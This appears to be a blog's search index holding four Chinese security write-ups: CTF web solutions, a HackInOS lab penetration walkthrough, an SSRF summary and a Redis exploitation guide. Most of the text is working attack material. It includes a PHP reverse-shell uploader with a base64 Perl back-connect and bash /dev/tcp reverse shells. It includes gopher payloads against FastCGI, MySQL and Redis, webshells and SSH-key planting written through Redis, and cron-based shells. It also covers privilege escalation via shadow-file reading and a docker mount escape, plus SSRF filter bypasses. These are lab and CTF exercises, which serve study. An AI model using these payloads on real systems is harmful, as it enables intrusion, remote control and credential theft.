<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CTF WEB记录(一)]]></title>
    <url>%2F2019%2F09%2F14%2FCTF-Web%E8%AE%B0%E5%BD%95(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[前言 CTF接触的越多越发现自己越来越菜，很多脑洞和知识面不够 由于现阶段仍有玩CTF的需要，因此本系列文章将认真记录那些能从中得到很大收获与感悟的CTF web题 [HCTF 2018]WarmUp 题目来源：BUUCTF 出题背景：phpmyadmin4.8.1任意文件包含漏洞 题解获取到提示hint.php：flag not here, and flag in ffffllllaaaagggg ffffllllaaaagggg并不存在于当前目录下，联想到CTF出题套路，猜测存在根目录下 获取到源码source.php 代码逻辑上看，需要绕过checkFile()函数，当其返回true时，将包含文件 在checkFile()函数中，如果file传入值存在?，那么取从开始到该?；否则取全部值作为$_page进行白名单验证 payload： 1source.php?file=hint.php?/../../../../ffffllllaaaagggg 拓展记录此题原因在于，我对这样的文件包含存在疑惑：最初在本地PHPstudy、wampserver、LAMP下，这样的文件包含方式无一成功 经过测试发现并确定，这种包含的前提是包含的文件必须是当前文件夹不存在的文件，只有这样才会将该文件解析成目录，从而遍历其他文件；此处hint.php?被解析认为是一个目录，但该目录并不存在，因此第一次../仅仅又是回到当前source.php的目录下 目录遍历 解析 ../ /var/www/html ../../ /var/www ../../../ /var ../../../../ / 此外，在Windows下hint.php?无法被解析为目录，在linux下成功认为是目录，原因为Windows系统文件命名不支持问号 Hgame2019-week2-php trick 题目来源：杭电某CTF比赛 考察：PHP常见特性 简介本例仅节选了部分内容，并简单修改方便记录。 题解12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php//admin.phphighlight_file(__FILE__);$str1 = (string)@$_GET['str1'];$str2 = (string)@$_GET['str2'];$str3 = @$_GET['str3'];$str4 = @$_GET['str4'];$str5 = @$_GET['H_game'];$url = @$_GET['url'];if( $str1 == $str2 )&#123; die('step 1 fail');&#125;if( md5($str1) != md5($str2) )&#123; die('step 2 fail');&#125;if( $str3 == $str4 )&#123; die('step 3 fail');&#125;if ( md5($str3) !== md5($str4))&#123; die('step 4 fail');&#125;if (strpos($_SERVER['QUERY_STRING'], "H_game") !==false) &#123; die('step 5 fail');&#125;if(is_numeric($str5))&#123; die('step 6 fail');&#125;if ($str5&lt;9999999999)&#123; die('step 7 fail');&#125;if ((string)$str5&gt;0)&#123; die('step 8 fial');&#125;if (parse_url($url, PHP_URL_HOST) !== "www.baidu.com")&#123; die('step 9 fail');&#125;if (parse_url($url,PHP_URL_SCHEME) !== "http")&#123; die('step 10 fail');&#125;$ch = curl_init();curl_setopt($ch,CURLOPT_URL,$url);$output = curl_exec($ch);curl_close($ch);if($output === FALSE)&#123; die('step 11 fail');&#125;else&#123; echo $output;&#125; 考察了几个简单的php trick md5+ php弱类型 1234567891011QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 md5、sha1不处理数组，返回false string()类型转换处理数组，返回false php在接受数据时会自动把+和.替换为_ php中数字总是比数组小 pase_url和PHP libcurl对url解析的差异 12345678完整url: scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]这里仅讨论url中不含'?'的情况php parse_url：host: 匹配最后一个@后面符合格式的hostlibcurl：host：匹配第一个@后面符合格式的host 如：http://u:p@a.com:80@b.com/ 12345678910111213php parse_url解析结果： schema: http user: u pass: p@a.com:80 host: b.com libcurl解析结果： schema: http host: a.com user: u pass: p port: 80 后面的@b.com/会被忽略掉 经过测试发现，libcurl这样的解析方式对版本存在要求，本地通过集成环境简单测试，发现 curl 7.56.0无法复现 curl 7.50.3复现成功 curl 7.38.0复现成功 curl 7.35.0以及以下复现失败 那么此处绕过方式：?url=http://@127.0.0.1:80@www.baidu.com/flag.php，必须加上端口 12345678&lt;?php//flag.phpif($_SERVER['REMOTE_ADDR'] != '127.0.0.1') &#123; die('only localhost can see it');&#125;else&#123; echo "flag&#123;this_is_flag!&#125;";&#125;?&gt; 因此，payload： 1http://192.168.1.134/ctf/test.php?str1=QNKCDZO&amp;str2=s878926199a&amp;str3[]=2&amp;str4[]=1&amp;H+game[]=123&amp;url=http://@127.0.0.1:80@www.baidu.com/ctf/flag.php easy_tornado 题目来源：2018护网杯 考察：tornado模板注入 简介谈谈自己在做的时候的疑惑和难点： 没有根据render联想到模板 不知道cookie_secret在哪里 模板注入那部分不知道tornado存在handler.settings，这个可能需要下载tornado源码查看 题解 点击flag.txt 点击welcome.txt 点击hints.txt flag在/fllllllllllllag中，可以将filename的参数值更改为fllllllllllllag，但提示出错： 可知filehash不正确，根据hint.txt，可猜测出需要获得cookie_secret，但协议中并没有cookie 联想到上面提示的render，猜测是模板注入，输入URL： 12/error?msg=&#123;&#123;1&#125;&#125; #返回1/error?msg=&#123;&#123;1*2&#125;&#125; #返回ORZ 可知对输入信息进行了过滤，但是SSTI的确存在 但跟以往的题目不同的是，这里不需要python的基类再寻找子函数，而是直接获取环境的变量 tornado框架中存在handler.setting 成功获取到cookie_secret 根据hint，得到flag flag在管理员手里 题目来源：Jarvis OJ 考察：哈希长度拓展攻击 简介关于哈希长度拓展攻击：https://xz.aliyun.com/t/2563 这道题不同的是salt长度不知，需要爆破，但该python库Windows下安装不成功，需要安装visual studio，Linux下运行脚本出错，因此直接作弊得到salt长度，手动提交 题解访问显示Only Admin can see the flag!!，抓包分析： 发现role存在序列化字符串，将guest修改为admin，没有任何变化 扫描目录发现文件：index.php~ Linux使用file index.php~，发现该文件为swp文件，修改后缀后使用vim -r恢复，得到源码 123456789101112131415161718192021222324&lt;?php $auth = false; $role = "guest"; $salt = if (isset($_COOKIE["role"])) &#123; $role = unserialize($_COOKIE["role"]); $hsh = $_COOKIE["hsh"]; if ($role==="admin" &amp;&amp; $hsh === md5($salt.strrev($_COOKIE["role"]))) &#123; $auth = true; &#125; else &#123; $auth = false; &#125; &#125; else &#123; $s = serialize($role); setcookie('role',$s); $hsh = md5($salt.strrev($s)); setcookie('hsh',$hsh); &#125; if ($auth) &#123; echo "&lt;h3&gt;Welcome Admin. Your flag is &#125; else &#123; echo "&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;"; &#125; ?&gt; 这是非常明显的哈希长度拓展攻击，要求 $role===”admin” $hsh === md5($salt.strrev($_COOKIE[“role”]) 并且现在已知： md5($salt.strrev(‘;”tseug”:5:s’)) == 3a4727d57463f122833d9e732f94e4e0 需得到md5($salt.strrev(&#39;;&quot;nimda&quot;:5:s&#39;))作为hsh提交，同时更改role为admin 和常规的题型不同的是，本例中$salt长度未知，需要进行爆破 使用python库hashpumpy hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message) 构造脚本： 需要对message进行url编码，request默认对get和post数据编码，不对cookie数据编码 1234567891011121314151617# -*- coding: utf-8 -*-import requests,hashpumpy,urllibdef webre(): #py2 url = 'http://web.jarvisoj.com:32778/' sha = '3a4727d57463f122833d9e732f94e4e0' string0 = ';"tseug":5:s' string1 = ';"nimda":5:s' for i in range(15): digest, message = hashpumpy.hashpump(sha,string0,string1,i) payload =&#123;'role':urllib.quote(message[::-1]), 'hsh':digest&#125; #payload =&#123;'role':(message[::-1]), 'hsh':digest&#125; print i,payload html = requests.get(url,cookies=payload).text#提交答案 if 'Welcome' in html: print html webre() 得到flag：Welcome Admin. Your flag is PCTF{H45h_ext3ndeR_i5_easy_to_us3} PORT51 题目来源：Jarvis OJ 考察知识点：curl 简介这道题回过头来非常简单，但的确是涉及到知识盲点 网址已经带了端口，不可能再加一个端口； 需要用curl –local-port指定本地使用一个端口去访问它 题解在公网服务器上执行：curl --local-port 51 http://web.jarvisoj.com:32770/获得flag 在本地是无法复现的，虽然本地计算机是以51端口访问，但是无法得知直接与网站发送请求的路由器是否以51号端口访问。 Login 题目来源：Jarvis OJ 考察知识点：md5($string,true) 简介主要查考MD5函数参数为true情况，结果为二进制格式 题解抓包，发现response中存在hint 关于PHP中md5函数： 1md5(string,raw) 参数 描述 string 必需。规定要计算的字符串。 raw 可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式。FALSE - 默认。32 字符十六进制数 当md5后的hex转换成字符串后，如果包含 ‘or’ 这样的字符串，那整个sql变成 1SELECT * FROM admin WHERE pass = ''or'6&lt;trash&gt;' 在MySQL中，字符串’1xxxxx’被视为’1’，于是很容易绕过 得到这样的字符串：ffifdyop =&gt; &#39;or&#39;6�]��!r,��b]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HackInOS渗透实战]]></title>
    <url>%2F2019%2F09%2F14%2FHackInOS%2F</url>
    <content type="text"><![CDATA[前言该靶机在VMware下无法运行，需virtualbox。 靶机设置相当有意思，初步涉及到内网渗透。 渗透信息收集netdiscover -r 192.168.0.0/24 nmap -A 192.168.0.115 whatweb 192.168.0.115 目录扫描出robots.txt 123User-agent:*Disallow:/upload.phpDisallow:/uploads 文件上传访问upload.php发现文件上传功能，并且发现提示： 访问404，从网络中找出源码 可看出，上传文件只允许为png和gif类型，并且需要绕过getimagesize() getimagesize()：获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息 关键点：getimagesize()是检查图片的前面16进制来检查是否为图片 绕过姿势： （1）伪造头部gif89a （2）图片马 copy 1.jpg/a+2.php/b webshell.jpg （3）十六进制编辑器直接写入命令 此处直接使用方法（1） 使用php反弹shell脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253GIF89a&lt;?php function which($pr) &#123; $path = execute("which $pr"); return ($path ? $path : $pr); &#125; function execute($cfe) &#123; $res = ''; if ($cfe) &#123; if(function_exists('exec')) &#123; @exec($cfe,$res); $res = join("\n",$res); &#125; elseif(function_exists('shell_exec')) &#123; $res = @shell_exec($cfe); &#125; elseif(function_exists('system')) &#123; @ob_start(); @system($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif(function_exists('passthru')) &#123; @ob_start(); @passthru($cfe); $res = @ob_get_contents(); @ob_end_clean(); &#125; elseif(@is_resource($f = @popen($cfe,"r"))) &#123; $res = ''; while(!@feof($f)) &#123; $res .= @fread($f,1024); &#125; @pclose($f); &#125; &#125; return $res; &#125; function cf($fname,$text)&#123; if($fp=@fopen($fname,'w')) &#123; @fputs($fp,@base64_decode($text)); @fclose($fp); &#125; &#125; $yourip = "192.168.0.113"; $yourport = '4444'; $usedb = array('perl'=&gt;'perl','c'=&gt;'c'); $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj". "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; cf('/tmp/.bc',$back_connect); $res = execute(which('perl')." /tmp/.bc $yourip $yourport &amp;"); ?&gt; 同时此处上传后的文件名是随机生成的，因此写一个小脚本列举出： 1234567import hashlibfor i in range(1,101): file_name = 'shell.php%d'%(i) md5 = hashlib.md5(file_name.encode(encoding='UTF-8')).hexdigest() with open('dir.txt','a') as f: f.writelines(md5+".php\n") 提权kali监听4444端口 dirb http://192.168.0.114:8000/uploads/ dir.txt，扫描到目标文件并触发shell 引入完整终端：python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; 先备份web源码审计： 1tar -czvf ./html/web.tar.gz ./html 在wp-config.php中发现数据库账号信息 获取系统信息 1234uname -acat /proc/version#查看suid文件find / -user root -perm -4000 -print 2&gt;/dev/null 发现/usr/bin/tail，查看/etc/shadow文件 尝试使用john破解john hash，得到密码为john 于是直接登录root，成功提权 内网 此处的内网渗透相对来说比较基础，甚至说有一点牵强，但对于认识内网渗透有一定引导作用，由于之前未接触过内网渗透，因此此处不过多涉及内网渗透的知识，之后另外学习并总结一些后渗透的姿势。 顺手查看ifconfig，发现存在内网 根据参考文章1，若想使用msf渗透内网，首先需要获得目标服务器与msf的meterpreter，再利用其它的模块展开内网攻击 反弹shell利用msf下的web_delivery模块,先 search web-delivery 1use exploit/multi/script/web_delivery 配置好相关的IP和端口，进而生成一段payload，目标执行后得到meterpreter 添加路由1use post/multi/manage/autoroute 成功添加路由后，扫描内网端口情况 端口扫描1234use auxiliary/scanner/portscan/tcpset RHOSTS 172.18.0.1-254set THREADS 10set TIMEOUT 100 此处扫描极慢，可适当调整参数，最终得到端口开放情况： 前面获取到了数据库账号信息，在服务器shell下登录mysql -h 172.18.0.3 -uwordpress -p 发现表 host_ssh_cred MD5解密后得到密码123456，直接ssh登录目标服务器 以root权限进入docker中docker run -v /:/root -i -t ubuntu /bin/bash 参考文章 【技术分享】使用 MSF 路由转发实现MSF框架的内网渗透 HackInOS渗透实战 使用msf进行反弹shell+内网渗透 文件上传漏洞之getimagesize()类型验证]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF漏洞总结]]></title>
    <url>%2F2019%2F09%2F04%2FSSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[前言因为过去学习中没有较全面的整理SSRF笔记，现重新学习并总结；由于SSRF网络教程已经很多，所以本篇大部分内容将参考网络教程，选择一部分在本地进行复现测试 关于SSRF服务端请求伪造，用户通过WEB访问/上传/发出请求，绕过服务器防火墙，获取服务器及其内网信息。SSRF可以说是一个媒介，结合服务器中的服务，常常可以形成一条完整的攻击链。 产生条件由于服务端提供了从其他服务器应用获取数据的功能且没有对用户可控的目标地址做过虑与限制。 在PHP中的curl()，file_get_contents()，fsockopen()等函数。 注：file_get_contents 情况使用 gopher 协议不能 URLencode 利用方式 演示环境为ssrf-lab，后端用curl实现 总述 可以对外网服务器所在内网/本地进行端口扫描，获取一些服务的banner信息。 攻击内网web应用（通过get传参就可以实现的攻击，如：st2,sqli等）。 利用file协议读取本地文件。 攻击fastcgi 反弹shell。 攻击redis、mysql等。 攻击运行在内网或本地的应用程序（比如溢出） file协议读取本地文件file:///etc/passwd dict协议探测端口有回显表示端口开放，无回显即端口关闭 dict://127.0.0.1:80 gopher协议 Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。 Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。 攻击内网主机假设有一台主机存在exp.php文件 12//exp.php&lt;?php system($_POST[e]);?&gt; 利用方式： 12345678POST /exp.php HTTP/1.1Host: 127.0.0.1User-Agent: curl/7.43.0Accept: */*Content-Length: 49Content-Type: application/x-www-form-urlencodede=bash -i &gt;%26 /dev/tcp/172.19.23.228/2333 0&gt;%261 构造gopher协议的url： 1gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i &gt;%2526 /dev/tcp/172.19.23.228/2333 0&gt;%25261null 湖湘杯2018 123456789101112131415161718192021&lt;?php if(!isset($_GET['url']))&#123; echo "ssrf me with parameter 'url'";&#125;$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); //echo $_GET['url'];curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch); //var_dump($_POST);$ip = $_SERVER['REMOTE_ADDR'];if(isset($_POST['user']))&#123; if($_POST['user']=="admin" &amp;&amp; $ip=="127.0.0.1")&#123; system("/var/www/html/ssrf/readflag");&#125;&#125;?&gt; gopher攻击内网redis见上一篇文章：Redis漏洞利用与SSRF gopher攻击FastCGI参考https://www.jianshu.com/p/fd27f0eedccf 利用条件 libcurl版本&gt;=7.45.0(由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断) PHP-FPM监听端口 PHP-FPM版本 &gt;= 5.3.3 知道服务器上任意一个php文件的绝对路径 转换为Gopher的EXP监听一个端口的流量 nc -lvvp 2333 &gt; 1.txt，执行EXP，流量打到2333端口 1python fpm.py -c "&lt;?php system('echo sectest &gt; /tmp/1.php'); exit;?&gt;" -p 2333 127.0.0.1 php文件绝对路径 fpm.py地址https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75url编码 1234f = open('1.txt')ff = f.read()from urllib import quoteprint quote(ff) 得到gopher的exp 1curl 'gopher://127.0.0.1:9000/_%01%01%97%9C%00%08%00%00%00%01%00%00%00%00%00%00%01%04%97%9C%01%D5%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%15SCRIPT_FILENAME/var/www/html/123.php%0B%15SCRIPT_NAME/var/www/html/123.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%15REQUEST_URI/var/www/html/123.php%01%04%97%9C%00%00%00%00%01%05%97%9C%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%97%9C%00%00%00%00' gopher攻击内网mysql MySQL有密码和无密码的认证方式不一样，无密码认证时直接发送TCP/IP数据包即可访问，有密码数据包中存在加盐加密。如果内网中的mysql数据库存在无密码的用户，可结合gopher协议进行攻击。 首先配置数据库，kali默认安装的为MariaDB，配置路径与mysql不同； 1234#进入mysql命令行，设置无密码：SET PASSWORD FOR root@localhost=PASSWORD('');#修改配置文件：vim /etc/mysql/mariadb.conf.d/50-server.cnf，添加skip-grant-tables 在kali下打开wireshark，监听any网卡 执行命令 123mysql -h127.0.0.1 -uroot -p#必须指定-h，否则流量不走网卡，无法抓取select flag from ssrf.flag;exit; 筛选出mysql数据包 跟踪TCP流，选取request请求，并显示为原始数据 编码为gopher协议格式 12345678910#encoding:utf-8def result(s): a=[s[i:i+2] for i in xrange(0,len(s),2)]#两两一组 return "curl gopher://127.0.0.1:3306/_%" + "%".join(a)if __name__ == '__main__': import sys s=sys.argv[1] print result(s) 得到payload 1curl gopher://127.0.0.1:3306/_%ae%00%00%01%85%a6%3f%20%00%00%00%01%2d%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%71%03%5f%6f%73%10%64%65%62%69%61%6e%2d%6c%69%6e%75%78%2d%67%6e%75%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%04%31%30%33%38%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%07%31%30%2e%31%2e%32%36%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%16%00%00%00%03%73%65%6c%65%63%74%2a%66%72%6f%6d%20%73%73%72%66%2e%66%6c%61%67%01%00%00%00%01 --output - &gt; mysql.txt 使用strings命令读取mysql.txt，获得输出结果 1strings mysql.txt gopher局限 大部分 PHP 并不会开启 fopen 的 gopher wrapper file_get_contents 的 gopher 协议不能 URLencode file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败 PHP 的 curl 默认不 follow 302 跳转 curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断）， 7.49 可用 bypass技巧 利用解析url绕过正则缺陷 123http://A.com@127.0.0.1http://A.com:B@127.0.0.1127.0.0.1#http://abc 原理： 123456789 authority path ┌───────────────┴─────────────────┐ ┌────┴───┐ abc://[username[:password]@](example.com)[:123]/path/data?key=value&amp;key2=value2#fragid1 └┬┘ └───────┬──────────┘ └────┬────┘ └──┬─┘ └─────────┬─────────┘ └──┬──┘scheme user information host port query fragment urn:example:mammal:monotreme:echidna └┬┘ └──────────────┬───────────────┘scheme path IP进制转换 123456#ip:127.0.0.1（1）8进制格式：0177.0.0.1（2）16进制格式：0x7F.00.00.01（3）8进制整数格式：017700000001（3）10进制整数格式：2130706433（4）16进制整数格式：0x7f000001 转换方法 8进制前加0，16进制前加0x 将ip的每一位由十进制转换为二进制，再将二进制转换为八进制或十六进制 关于整数格式：ipv4是32位二进制数，将其转换为32位二进制数，再将其转换为十进制或十六进制 短网址 12（1）百度短网址转换：https://dwz.cn #不支持ip（2）TinyURL：https://tinyurl.com/create.php #支持ip 可以指向任意 ip 的域名：xip.io 12345678910111213#ip:127.0.0.1127.0.0.1.xip.iowww.127.0.0.1.xip.iomysite.127.0.0.1.xip.iofoo.bar.127.0.0.1.xip.io#利用ssrf.php?url=http://127.0.0.1.xip.io/orssrf.php?url=http://www.127.0.0.1.xip.io/orssrf.php?url=http://evi1.cn.127.0.0.1.xip.io/orssrf.php?url=dict://evi1.cn.127.0.0.1.xip.io:22/info 句号绕过：127。0。0。1 添加端口号 案例：内网编织者百度内网手动编织! 利用dns将域名解析为内网ip 利用301或者302跳转 123http://www.th1s.cn/test/ssrf.phpssrf.php里面的内容为：&lt;?php header('Location:10.1.1.1');?&gt; 参考文章 SSRF学习笔记 ssrf攻击内网应用 SSRF 学习笔记 gopher 协议攻击内网 mysql gopher SSRF攻击内网应用复现]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis漏洞利用与SSRF]]></title>
    <url>%2F2019%2F09%2F02%2FRedis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8ESSRF%2F</url>
    <content type="text"><![CDATA[前言本想重新总结一下ssrf，但一想gopher攻击redis还没了解过，于是单独学习redis漏洞利用，复现过程中记录了这一篇文章。 关于redisredis是一种key-value键值对的非关系型数据库，默认运行在6379端口 它启动时不会像apache一样，以一种www-data低权限身份运行。而是以运行者的身份，例如用root权限直接运行redis时，redis的权限就是root权限 其次它的默认配置是无需密码，可能会造成默认的未授权访问 redis还支持本地存储，如果配置不当将导致任意文件写入的发生 未授权访问redis环境搭建靶机： os：centos7 ip：192.168.64.136 安装redis 1234567891011#第一步：下载redis安装包wget http://download.redis.io/releases/redis-4.0.6.tar.gz#第二步：解压压缩包tar -zxvf redis-4.0.6.tar.gz#第三步：yum安装gcc依赖yum install gcc#第四步：跳转到redis解压目录下cd redis-4.0.6#第五步：编译安装make MALLOC=libccd src &amp;&amp; make install 同时修改redis配文件 1vim redis.conf 在bind 127.0.0.1 前插入“#“，同时将保护模式protected mode的值更改为“no”，通过这条设置，其他服务器将允许连接redis并且可做出写入等操作。 启动redis 1234#直接启动[root@localhost src]# ./redis-server#带上配置文件启动[root@localhost redis-4.0.6]# ./src/redis-server redis.conf 攻击机： os：Ubuntu18.04 ip：192.168.64.142 安装redis 12sudo apt-get updatesudo apt-get install redis-server 值得一提的是，通过apt-get安装redis并运行，redis权限为redis并非为root 写入SSH key现在攻击机本地~/.ssh目录下生成一对密钥：id_rsa和id_rsa.pub 1xm@xm：〜/ .ssh $ ssh-keygen -t rsa 然后连接靶机的redis，并写入ssh公钥id_rsa.pub 12345redis-cli -h 192.168.64.136#连接靶机config set dir /root/.ssh #设置本地存储文件目录config set dbfilename authorized_keys #设置本地存储文件名\set x "\n\n\n[本地id_rsa.pub的值]\n\n\n"#设置一个值为id_rsa.pub公钥值save#存储数据 成功在靶机中写入公钥，直接通过ssh连接： 1ssh -i id_rsa root@192.168.64.136#指定私钥 利用计划任务反弹shell类似于上面的redis文件写入，写入定时命令 12345redis-cli -h 192.168.64.136#连接靶机set x "\n* * * * * /bin/bash -i &gt; /dev/tcp/192.168.64.136/2333 0&lt;&amp;1 2&gt;&amp;1\n"#每秒钟弹一次shellconfig set dir /var/spool/cron/config set dbfilename rootsave 写入成功后本地监听2333端口，接收到反弹的shell 写入webshell12345redis-cli -h 192.168.64.136#连接靶机set x "&lt;?php phpinfo();?&gt;"config set dir /var/www/html/config set dbfilename shell.phpsave 成功在web目录下生成shell.php SSRF攻击redis 未授权访问redis条件存在限制，若开启了protected-mode，外网访问是不具有写入权限的；若绑定了127.0.0.1，那么外网将无法访问；但如果存在SSRF漏洞，那么通过Gopher协议可对本地redis进行攻击 Gopher协议是HTTP协议出现之前，在Internet上常常和常用的一个协议。当然现在Gopher协议已经慢慢淡出历史.Gopher协议可以做很多事情，特别是在SSRF中可以发挥很多重要的作用。利用此协议可以攻击内网的FTP，Telnet，Redis，Memcache，也可以进行GET，POST请求。这无疑极大拓宽了SSRF的攻击面。 payload：gopher://ip:port/_payload 写入webshell将一下命令打包成gopher.sh文件 12345redis-cli -h $1 -p $2 set 1 '&lt;?php eval($_POST["pass"]);?&gt;'redis-cli -h $1 -p $2 config set dir /var/www/htmlredis-cli -h $1 -p $2 config set dbfilename bbb.phpredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 使用socat进行端口转发 1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 将本地的4444端口转发到本地的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。 执行./gopher.sh 127.0.0.1 4444，抓取到数据并写入1.txt： 将捕捉到的转换为gopher格式 python转换脚本： 1234567f = open('1.txt', 'r')s = ''for line in f.readlines(): line = line.replace(r"\r", "%0d%0a") line = line.replace("\n", '') s = s + lineprint s.replace("$", "%24") 此处需要注意，使用python脚本将流量内容转换后，还需要将一句话中的$、?、;、[、]这几个字符url编码，否则会提示curl: (3) [globbing] illegal character in range specification at pos 103 如果写入免杀的一句话，一步步fuzz即可。 模拟ssrf访问： 1[root@localhost xm]# curl -v 'gopher://127.0.0.1:6379/_*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0a1%0d%0a%2429%0d%0a%3c%3fphp eval(%24_POST%5b"pass"%5d)%3b%3f%3e%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2413%0d%0a/var/www/html%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%247%0d%0abbb.php%0d%0a*1%0d%0a%244%0d%0asave%0d%0a*1%0d%0a%244%0d%0aquit%0d%0a' 成功在/var/www/html/下生成bbb.php 反弹shell 文件名必须为root，此处靶机环境为centos7，其他Linux需要修改目录 首先要明确第一点，用写入crontab的方式要求redis必须是root用户启动，否则无法正常执行 将下列内容写入gopher.sh中： 12345echo -e "\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.64.142 0&gt;&amp;1\n\n\n"|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit 本地监听： 1socat -v tcp-listen:4444,fork tcp-connect:localhost:6379 执行gopher.sh并捕捉到流量，将其写入至1.txt： 将捕捉到的转换为gopher格式 python转换脚本： 12345678910111213141516171819202122#coding: utf-8import sysexp = ''with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in '&gt;&lt;+': continue elif line[-3:-1] == r'\r': if len(line) == 3: exp = exp + '%0a%0d%0a' else: line = line.replace(r'\r', '%0d%0a') line = line.replace('\n', '') exp = exp + line elif line == '\x0a': exp = exp + '%0a' else: line = line.replace('\n', '') exp = exp + lineprint exp 转换结果为： 